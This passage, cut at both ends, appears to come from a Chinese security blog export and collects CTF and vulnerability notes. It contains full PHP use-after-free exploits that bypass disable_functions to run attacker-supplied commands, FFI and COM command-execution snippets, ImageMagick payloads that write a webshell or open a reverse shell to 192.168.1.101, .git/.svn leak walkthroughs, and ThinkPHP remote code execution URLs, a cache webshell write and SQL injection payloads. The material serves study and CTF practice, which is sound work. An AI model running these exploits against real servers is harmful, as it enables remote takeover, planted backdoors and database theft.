0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = \"\"; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; class ryat &#123; var $ryat; var $chtg; function __destruct() &#123; $this-&gt;chtg = $this-&gt;ryat; $this-&gt;ryat = 1; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; if(stristr(PHP_OS, 'WIN')) &#123; die('This PoC is for *nix systems only.'); &#125; $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_repeat('A', 79); $poc = 'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:\"ryat\":2:&#123;s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(\"UAF failed\"); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(\"Couldn't determine binary base address\"); &#125; if(!($elf = parse_elf($base))) &#123; die(\"Couldn't parse ELF header\"); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(\"Couldn't get basic_functions address\"); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(\"Couldn't get zif_system address\"); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; FFI 扩展FFI扩展php&gt;7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的https://www.laruence.com/2020/03/11/5475.html 123456&lt;?php$ffi = FFI::cdef(\"int system(const char *command);\");$ffi-&gt;system(\"/readflag &gt; /tmp/123\");echo file_get_contents(\"/tmp/123\");@unlink(\"/tmp/123\");?&gt; 用蚁剑 Json Serializer UAF利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是:7.1 – all versions to date7.2 &lt; 7.2.19 (released: 30 May 2019)7.3 &lt; 7.3.6 (released: 30 May 2019) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256&lt;?php# Author: https://github.com/mm0r1$cmd = $_POST[\"pass\"];$n_alloc = 10; # increase this value if you get segfaultsclass MySplFixedArray extends SplFixedArray &#123; public static $leak;&#125;class Z implements JsonSerializable &#123; public function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; public function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; public function ptr2str($ptr, $m = 8) &#123; $out = \"\"; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; # unable to leak ro segments public function leak1($addr) &#123; global $spl1; $this-&gt;write($this-&gt;abc, 8, $addr - 0x10); return strlen(get_class($spl1)); &#125; # the real deal public function leak2($addr, $p = 0, $s = 8) &#123; global $spl1, $fake_tbl_off; # fake reference zval $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x20, 6); # type (string) $leak = strlen($spl1::$leak); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; public function parse_elf($base) &#123; $e_type = $this-&gt;leak2($base, 0x10, 2); $e_phoff = $this-&gt;leak2($base, 0x20); $e_phentsize = $this-&gt;leak2($base, 0x36, 2); $e_phnum = $this-&gt;leak2($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = $this-&gt;leak2($header, 0, 4); $p_flags = $this-&gt;leak2($header, 4, 4); $p_vaddr = $this-&gt;leak2($header, 0x10); $p_memsz = $this-&gt;leak2($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; public function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = $this-&gt;leak2($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = $this-&gt;leak2($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = $this-&gt;leak2($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = $this-&gt;leak2($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; public function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = $this-&gt;leak2($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; public function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = $this-&gt;leak2($addr); $f_name = $this-&gt;leak2($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return $this-&gt;leak2($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; public function jsonSerialize() &#123; global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc; $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = new DateInterval('PT1S'); $room = []; for($i = 0; $i &lt; $n_alloc; $i++) $room[] = new Z(); $_protector = $this-&gt;ptr2str(0, 78); $this-&gt;abc = $this-&gt;ptr2str(0, 79); $p = new DateInterval('PT1S'); unset($y[0]); unset($p); $protector = \".$_protector\"; $x = new DateInterval('PT1S'); $x-&gt;d = 0x2000; $x-&gt;h = 0xdeadbeef; # $this-&gt;abc is now of size 0x2000 if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) &#123; die('UAF failed.'); &#125; $spl1 = new MySplFixedArray(); $spl2 = new MySplFixedArray(); # some leaks $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120); $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128); $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8); $abc_addr = $php_heap - 0x218; # create a fake class_entry $fake_obj = $abc_addr; $this-&gt;write($this-&gt;abc, 0, 2); # type $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry # copy some of class_entry definition for($i = 0; $i &lt; 16; $i++) &#123; $this-&gt;write($this-&gt;abc, 0x10 + $i * 8, $this-&gt;leak1($class_entry + 0x10 + $i * 8)); &#125; # fake static members table $fake_tbl_off = 0x70 * 4 - 16; $this-&gt;write($this-&gt;abc, 0x30, $abc_addr + $fake_tbl_off); $this-&gt;write($this-&gt;abc, 0x38, $abc_addr + $fake_tbl_off); # fake zval_reference $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval $this-&gt;write($this-&gt;abc, $fake_tbl_off + 8, 10); # zval type (reference) # look for binary base $binary_leak = $this-&gt;leak2($handlers + 0x10); if(!($base = $this-&gt;get_binary_base($binary_leak))) &#123; die(\"Couldn't determine binary base address\"); &#125; # parse elf header if(!($elf = $this-&gt;parse_elf($base))) &#123; die(\"Couldn't parse ELF\"); &#125; # get basic_functions address if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) &#123; die(\"Couldn't get basic_functions address\"); &#125; # find system entry if(!($zif_system = $this-&gt;get_system($basic_funcs))) &#123; die(\"Couldn't get zif_system address\"); &#125; # copy hashtable offsetGet bucket $fake_bkt_off = 0x70 * 5 - 16; $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50); for($i = 0; $i &lt; 4; $i++) &#123; $this-&gt;write($this-&gt;abc, $fake_bkt_off + $i * 8, $this-&gt;leak2($function_data + 0x40 * 4, $i * 8)); &#125; # create a fake bucket $fake_bkt_addr = $abc_addr + $fake_bkt_off; $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr); for($i = 0; $i &lt; 3; $i++) &#123; $this-&gt;write($this-&gt;abc, 0x58 + $i * 4, 1, 4); &#125; # copy bucket zval $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off); for($i = 0; $i &lt; 12; $i++) &#123; $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + $i * 8, $this-&gt;leak2($function_zval, $i * 8)); &#125; # pwn $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + 0x30, $zif_system); $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr + 0x70); $spl1-&gt;offsetGet($cmd); exit(); &#125;&#125;$y = [new Z()];json_encode([&amp;$y]);?&gt; Backtrace UAF影响版本是7.0-7.4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210&lt;?php# Author: https://github.com/mm0r1pwn($_POST[\"pass\"]);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1]['args'])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = \"\"; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat('A', 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, 'WIN')) &#123; die('This PoC is for *nix systems only.'); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat('A', 79)); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(\"UAF failed\"); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(\"Couldn't determine binary base address\"); &#125; if(!($elf = parse_elf($base))) &#123; die(\"Couldn't parse ELF header\"); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(\"Couldn't get basic_functions address\"); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(\"Couldn't get zif_system address\"); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125;?&gt; COMwindow下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll exp.php 12345678&lt;?php$command = $_GET['cmd'];$wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能$exec = $wsh-&gt;exec(\"cmd /c\".$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; ImageMagickimagemagick是一个用于处理图片的程序，如果上传的图片含有攻击代码，在处理时可被远程执行任意代码（CVE-2016–3714）写一句话到网站根目录下： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg\"|echo \\'&lt;?php eval($_POST[\\'ant\\']);?&gt;\\' &gt; shell.php\")'pop graphic-context 反弹 shell: 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg\"|bash -i &gt;&amp; /dev/tcp/192.168.1.101/2333 0&gt;&amp;1\")'pop graphic-context 例题EasyThinkinghttps://xz.aliyun.com/t/7131即session后缀是我们可控的，那么只要在写入session时数据我们可控，便可进行写shell；查看控制器，其主要逻辑代码位于app/home/controller/Member.php这个控制器内。Member控制器的search方法有这样一个判断： 1234if (!session('?UID'))&#123; return redirect('/home/member/login'); &#125;$data = input(\"post.\");$record = session(\"Record\");if (!session(\"Record\"))&#123; session(\"Record\",$data[\"key\"]);&#125; https://github.com/mm0r1/exploits/tree/master 参考文章：https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/3d4335ed.html https://blog.csdn.net/rfrder/article/details/109078117 https://www.anquanke.com/post/id/208451","categories":[],"tags":[],"author":"ye1s"},{"title":"CTFHub学习","slug":"CTFHub学习","date":"2020-12-18T15:39:20.000Z","updated":"2021-01-06T09:21:57.056Z","comments":true,"path":"article/113c40a3.html","link":"","permalink":"https://blog.cfyqy.com/article/113c40a3.html","excerpt":"CTFHub题目学习","text":"CTFHub题目学习 信息泄露gitgit相关命令 https://blog.csdn.net/weixin_45254208/article/details/107810572 log解法一：git_extract.py直接出结果 1python2 git_extract.py http://challenge-15f179a684f3a620.sandbox.ctfhub.com:10080/.git/ 解法二： 12python GitHack.py http://challenge-3d5f95fbd136fa99.sandbox.ctfhub.com:10080/.git git log查看提交历史版本回滚 1git reset --hard 349eb2df182641950bf27a24df6dc3c8c52fd9c3 stash解法一：git_extract.py直接出结果 1python2 git_extract.py http://challenge-ea20b24a0fde9085.sandbox.ctfhub.com:10080/.git/ 解法二：GitHack.py 得文件执行 git stash list 发现 stash执行 git stash pop 发现从 git 栈中弹出来一个包含flag的文件 版本回滚 1git reset --hard 349eb2df182641950bf27a24df6dc3c8c52fd9c3 indexsvnSubversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 安装perl组件： 12sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl` 然后需要安装svn服务： 1apt-get install subversion gitclone: 1git clone https://github.com/kost/dvcs-ripper 下载解压后进入dvcs-ripper工具目录，然后给权限：chmod 755 *进入目录用 1./rip-svn.pl -v -u http://challenge-fb13f9afd9ee3b28.sandbox.ctfhub.com:10080/.svn/ 得到的还原目录数据在.svn目录下，需要ls -al查看 12svn1.6及以前版本会在项目的每个文件夹下都生成一个.svn文件夹，里面包含了所有文件的备份，文件名为 .svn/text-base/文件名.svn-basesvn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份 这是缺少perl模块的报错我这里提示我缺少的是 SQLite 所以下 SQLite 具体下载什么看提示 执行需要root权限 123perl -MCPAN -e shellinstall DBD::SQLiteexit HG脚本：dvcs-ripper-master 1sudo ./rip-hg.pl -v -u http://challenge-6b91e8ced3bbc632.sandbox.ctfhub.com:10080/.hg/ 进入.hg目录，并寻找flag 123456ye1s@kali:~/Desktop/tool/dvcs-ripper/.hg$ sudo grep -r \"flag\" ./Binary file ./undo.dirstate matches./last-message.txt:add flagBinary file ./store/undo matches./store/fncache:data/flag_2646614128.txt.iBinary file ./store/00manifest.i matches 查看.hg/store/fncache可知 flag 的文件名为flag_88274161.txt，直接访问即可得 flag 备份文件网站备份拿disearch扫一下 1python dirsearch.py -u http://challenge-d7b90efa6684f0b0.sandbox.ctfhub.com:10080/ -e * url访问flag_235451560.txt,得到flag bak文件题目提示Flag in index.php source code 访问index.php.bak下载得到源码，flag在源码里 vim缓存​ 程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常 访问.index.php.swp,下载文件，记事本打开，Ctrl+F搜索ctfhub得到flag .DS_Store.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露 1python2 ds_store_exp.py http://challenge-ade6b89566c8695c.sandbox.ctfhub.com:10080/.DS_Store PHPINFOphpinfo.php搜索ctfhub{","categories":[],"tags":[]},{"title":"thinkphp学习","slug":"hinkphp","date":"2020-12-15T16:24:43.000Z","updated":"2021-04-25T12:42:56.352Z","comments":true,"path":"article/b96f5dfe.html","link":"","permalink":"https://blog.cfyqy.com/article/b96f5dfe.html","excerpt":"thinkphp 漏洞的汇总","text":"thinkphp 漏洞的汇总 创建项目1composer create-project topthink/think tp500 5.0.0 --prefer-dist 修改项目根目录下的 composer.json 文件 123\"require\": &#123;\"topthink/framework\": \"5.1.6\",&#125; 再更新项目 1composer update 5.0.0~5.0.23 RCE问题的根源在于请求方法的获取接收了不可信数据,Request类的变量被覆盖导致RCE 以 thinkphp 5.0.22 完整版为例，下载地址：http://www.thinkphp.cn/down/1260.htmlexp1: 1234http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami exp2: 12345http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=testPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 漏洞分析详情可看 ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析 3.2.3~5.0.10 缓存类RCE漏洞利用条件：1.基于tp5开发的代码中使用了Cache::set 进行缓存2.在利用版本范围内3.runtime目录可以访问 详情可看:https://paper.seebug.org/374/漏洞形成原因对传入的value没有过滤，序列化后直接保存到文件里，可以用%0d%0a进行换行摆脱序列化，用注释符//注释掉后面的字符。 1234567891011121314151617181920212223242526272829303132/** * 写入缓存 * @access public * @param string $name 缓存变量名 md5(键名) * @param mixed $value 存储数据 键值 * @param int $expire 有效时间 0为永久 * @return boolean */public function set($name, $value, $expire = null) &#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; $filename = $this-&gt;getCacheKey($name); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . $data . \"\\n?&gt;\"; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125; &#125; 环境搭建首先要有缓存操作文件 1234567891011121314&lt;?phpnamespace app\\index\\controller;use think\\Cache;class Index&#123; public function index() &#123; Cache::set(\"name\",input(\"get.username\")); return 'Cache success'; &#125;&#125; 访问该页面并写入shell 1127.0.0.1/tp/public/index.php/index/index/index?username=syst1m%0d%0a@eval($_GET[_]);// 分析源码可知,缓存文件默认保存在/runtime/cache/目录下，程序先获得键名（name）的 md5 值，然后将该 md5 值的前 2 个字符作为缓存子目录，后 30 字符作为缓存文件名，md5(&#39;name&#39;)=b068931cc450442b63f5b3d276ea4297,所以缓存文件的访问路径为 1http://127.0.0.1/tp/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php 5.0.7~5.0.22未开启强制路由导致rce1234?s=index/think\\config/get&amp;name=database.username # 获取配置信息?s=index/\\think\\Lang/load&amp;file=../../test.jpg # 包含任意文件?s=index/\\think\\Config/load&amp;file=../../t.php # 包含任意.php文件?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id SQL注入tp5的注入都比较鸡肋，不能进行子查询，tp3的可以 ThinkPHP 5.0.9 鸡肋SQL注入https://xz.aliyun.com/t/2812只能通过报错获取类似于database()、user()这类信息，而不支持子查询 环境：https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/wwwindex.php 123456789public function index()&#123; $ids = input('ids/a'); $t = new User(); $result = $t-&gt;where('id', 'in', $ids)-&gt;select(); foreach($result as $row) &#123; echo \"&lt;p&gt;Hello, &#123;$row['username']&#125;&lt;/p&gt;\"; &#125;&#125; exp 1http:&#x2F;&#x2F;localhost&#x2F;public&#x2F;index.php?ids[0,updatexml(0,concat(0xa,user()),0)]&#x3D;1 ThinkPHP 5.0.15 update/insert 注入环境：index.php 123456public function index()&#123; $username = input('get.username/a'); $res = db('user')-&gt;where(['id'=&gt; 1])-&gt;insert(['username'=&gt;$username]); var_dump($res);&#125; 利用： 1234http://localhost/tp5.0.15/public/index.php?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 ThinkPHP 3.2.3 where注入下载3.2.3版本的ThinkPHP，在IndexController.class.php中创建一个demo public function index(){ $data = M(‘user’)-&gt;find(I(‘GET.id’)); var_dump($data);}下载3.2.3版本的ThinkPHP，在IndexController.class.php中创建一个demo 1234public function index()&#123; $data = M('user')-&gt;find(I('GET.id')); var_dump($data);&#125; 利用 1http://localhost/tp323/index.php?id[where]=3 and 1=updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)%23 ThinkPHP 3.2.3 bind 注入demo 12345678public function index()&#123; $User = M(\"user\"); $user['id'] = I('id'); $data['username'] = I('username'); $data['password'] = I('password'); $valu = $User-&gt;where($user)-&gt;save($data); var_dump($valu);&#125; 5.1未开启强制路由导致的RCEthinkphp默认没有开启强制路由说明我们可以使用路由兼容模式 s 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器任意方法来执行，eg: http://site/?s=模块/控制器/方法poc1详情可看 https://www.cnblogs.com/wangtanzhi/p/12715255.html 1http://127.0.0.1/tp5117/public/index.php?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=whoami poc2 1http://127.0.0.1/tp5117/public/index.php?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami Thinkphp5.1 ~ 5.2 全版本代码执行https://www.secpulse.com/archives/95952.html 环境：需要在index.php 中添加error_reporting(0);，要不会报filter错误 1234567// 加载基础文件require __DIR__ . '/../thinkphp/base.php';// 支持事先使用静态方法设置Request对象和Config对象error_reporting(0);// 